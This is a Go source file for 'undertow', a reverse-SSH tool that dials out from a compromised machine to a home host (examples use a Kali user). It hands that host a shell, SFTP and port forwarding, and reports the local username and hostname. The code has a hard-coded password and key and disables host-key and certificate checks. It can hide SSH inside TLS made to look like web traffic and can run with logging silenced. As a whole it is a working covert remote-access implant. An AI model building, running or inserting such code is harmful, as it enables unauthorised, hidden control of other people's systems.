// undertow - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"os/user"
	"path"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type params struct {
	LUSER        string
	LHOST        string
	LPORT        uint
	homeBindPort uint
	listen       bool
	shell        string
	noShell      bool
	verbose      bool
	tlsWrap      bool
	tlsSNI       string
}

func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		if forbidden {
			log.Printf("Denying local port forwarding request %s:%d", dhost, dport)
			return false
		}
		log.Printf("Accepted forward to %s:%d", dhost, dport)
		return true
	}
}

func createReversePortForwardingCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		log.Printf("Attempt to bind at %s:%d granted", host, port)
		return true
	}
}

func createSessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		if forbidden {
			log.Println("Denying shell/exec/subsystem request")
			return false
		}
		return true
	}
}

func createPasswordHandler(localPassword string) ssh.PasswordHandler {
	return func(ctx ssh.Context, pass string) bool {
		passed := subtle.ConstantTimeCompare([]byte(pass), []byte(localPassword)) == 1
		if passed {
			log.Printf("Successful authentication with password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			log.Printf("Invalid password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createPublicKeyHandler(authorizedKey string) ssh.PublicKeyHandler {
	if authorizedKey == "" {
		return nil
	}

	return func(ctx ssh.Context, key ssh.PublicKey) bool {
		master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
		if err != nil {
			log.Println("Encountered error while parsing public key:", err)
			return false
		}
		passed := bytes.Equal(key.Marshal(), master.Marshal())
		if passed {
			log.Printf("Successful authentication with ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			log.Printf("Invalid ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createSFTPHandler() ssh.SubsystemHandler {
	return func(s ssh.Session) {
		server, err := sftp.NewServer(s)
		if err != nil {
			log.Printf("Sftp server init error: %s\n", err)
			return
		}

		log.Printf("New sftp connection from %s", s.RemoteAddr().String())
		if err := server.Serve(); err == io.EOF {
			server.Close()
			log.Println("Sftp connection closed by client")
		} else if err != nil {
			log.Println("Sftp server exited with error:", err)
		}
	}
}

func generateSelfSignedCert(sni string) (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{sni},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return tls.X509KeyPair(certPEM, keyPEM)
}

func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool, tlsWrap bool, tlsSNI string) (net.Listener, error) {
	var (
		err    error
		client *gossh.Client
	)

	config := &gossh.ClientConfig{
		User: username,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for password on failure
	for {
		if tlsWrap {
			// TLS-wrapped connection: TCP -> TLS -> SSH
			tcpConn, dialErr := net.Dial("tcp", address)
			if dialErr != nil {
				return nil, dialErr
			}
			tlsConfig := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         tlsSNI,
				NextProtos:         []string{"h2", "http/1.1"},
			}
			tlsConn := tls.Client(tcpConn, tlsConfig)
			sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
			if dialErr == nil {
				client = gossh.NewClient(sshConn, chans, reqs)
				break
			}
			tlsConn.Close()
			err = dialErr
		} else {
			client, err = gossh.Dial("tcp", address, config)
			if err == nil {
				break
			}
		}

		if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
			fmt.Println("Enter password:")
			data, err := term.ReadPassword(int(syscall.Stdin))
			if err != nil {
				log.Println(err)
				continue
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
		} else {
			return nil, err
		}
	}

	bindAddr := fmt.Sprintf("127.0.0.1:%d", homeBindPort)
	if homeBindPort == 0 {
		log.Println("Requesting random port allocation from SSH server...")
	}
	ln, err := client.Listen("tcp", bindAddr)
	if err != nil {
		return nil, err
	}

	actualAddr := ln.Addr().String()
	log.Printf("Success: listening at home on %s", actualAddr)

	// Verify port allocation worked (defensive check)
	if homeBindPort == 0 && strings.HasSuffix(actualAddr, ":0") {
		log.Println("Warning: SSH server returned port 0 - random port allocation may not be supported")
	}

	// Attempt to send extra info back home in the info message of an extra ssh channel
	sendExtraInfo(client, ln.Addr().String())

	return ln, nil
}

type ExtraInfo struct {
	CurrentUser      string
	Hostname         string
	ListeningAddress string
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {

	extraInfo := ExtraInfo{ListeningAddress: listeningAddress}

	if usr, err := user.Current(); err != nil {
		extraInfo.CurrentUser = "ERROR"
	} else {
		extraInfo.CurrentUser = usr.Username
	}
	if hostname, err := os.Hostname(); err != nil {
		extraInfo.Hostname = "ERROR"
	} else {
		extraInfo.Hostname = hostname
	}

	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&extraInfo))
	// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
		log.Printf("Could not create info channel: %+v", err)
	}
	// If the channel is actually accepted, just close it again
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

func createExtraInfoHandler() ssh.ChannelHandler {
	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
		var extraInfo ExtraInfo
		err := gossh.Unmarshal(newChan.ExtraData(), &extraInfo)
		newChan.Reject(gossh.Prohibited, "th4nkz")
		if err != nil {
			log.Printf("Could not parse extra info from %s", conn.RemoteAddr())
			return
		}
		log.Printf(
			"New connection from %s: %s on %s reachable via %s",
			conn.RemoteAddr(),
			extraInfo.CurrentUser,
			extraInfo.Hostname,
			extraInfo.ListeningAddress,
		)
	}
}

func setupParameters(noCLI string, tlsWrapVar string, tlsSNIVar string) *params {
	if noCLI != "" {
		return setupParametersWithoutCLI(tlsWrapVar, tlsSNIVar)
	}

	var help = fmt.Sprintf(`undertow v%[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: %[1]s [options] [[<user>@]<target>]

Examples:
  Bind:
	%[1]s -l
	%[1]s -v -l -p 4444
  Reverse:
	%[1]s 192.168.0.1
	%[1]s kali@192.168.0.1
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-l, Start undertow in listening mode (overrides reverse scenario)
	-p, Port at which undertow is listening for incoming ssh connections (bind scenario)
		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
		(if only remote port forwarding is needed, e.g. when catching reverse connections)
	-v, Emit log output

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user other than '%[8]s' while dialling home

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)

	flag.Usage = func() {
		fmt.Print(help)
		os.Exit(1)
	}

	p := params{}

	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert LPORT: ", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert BPORT: ", err)
	}
	flag.UintVar(&p.LPORT, "p", uint(lport), "")
	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
	flag.BoolVar(&p.listen, "l", false, "")
	flag.StringVar(&p.shell, "s", defaultShell, "")
	flag.BoolVar(&p.noShell, "N", false, "")
	flag.BoolVar(&p.verbose, "v", false, "")
	flag.Parse()

	if p.LPORT > 65535 {
		log.Fatal("Error: Port (-p) must be between 1 and 65535")
	}
	if p.homeBindPort > 65535 {
		log.Fatal("Error: Bind port (-b) must be between 1 and 65535")
	}

	if !p.verbose {
		log.SetOutput(io.Discard)
	}

	switch len(flag.Args()) {
	case 0:
		p.LUSER = LUSER
		p.LHOST = LHOST
	case 1:
		target := strings.Split(flag.Args()[0], "@")
		switch len(target) {
		case 1:
			p.LUSER = LUSER
			p.LHOST = target[0]
		case 2:
			p.LUSER = target[0]
			p.LHOST = target[1]
		default:
			log.Fatalf("Could not parse '%s'", target)
		}

	default:
		log.Println("Invalid arguments, check usage!")
		os.Exit(1)
	}

	p.tlsWrap = tlsWrapVar != ""
	p.tlsSNI = tlsSNIVar

	return &p
}

func setupParametersWithoutCLI(tlsWrapVar string, tlsSNIVar string) *params {
	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert LPORT: ", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert BPORT: ", err)
	}

	log.SetOutput(io.Discard)

	return &params{
		LUSER:        LUSER,
		LHOST:        LHOST,
		LPORT:        uint(lport),
		homeBindPort: uint(homeBindPort),
		listen:       false,
		shell:        defaultShell,
		noShell:      false,
		verbose:      false,
		tlsWrap:      tlsWrapVar != "",
		tlsSNI:       tlsSNIVar,
	}
}

func run(p *params, server ssh.Server) {
	var (
		ln  net.Listener
		err error
	)

	if p.listen || p.LHOST == "" {
		log.Printf("Starting ssh server on :%d", p.LPORT)
		ln, err = net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
		if err == nil {
			if p.tlsWrap {
				cert, tlsErr := generateSelfSignedCert(p.tlsSNI)
				if tlsErr != nil {
					log.Fatal("Failed to generate TLS certificate: ", tlsErr)
				}
				tlsConfig := &tls.Config{
					Certificates: []tls.Certificate{cert},
					NextProtos:   []string{"h2", "http/1.1"},
				}
				ln = tls.NewListener(ln, tlsConfig)
				log.Printf("Success: TLS listening on %s", ln.Addr().String())
			} else {
				log.Printf("Success: listening on %s", ln.Addr().String())
			}
		}
	} else {
		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
		if p.tlsWrap {
			log.Printf("Dialling home via TLS+SSH to %s (SNI: %s)", target, p.tlsSNI)
		} else {
			log.Printf("Dialling home via ssh to %s", target)
		}
		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose, p.tlsWrap, p.tlsSNI)
	}

	if err != nil {
		log.Fatal(err)
	}
	defer ln.Close()
	log.Fatal(server.Serve(ln))
}
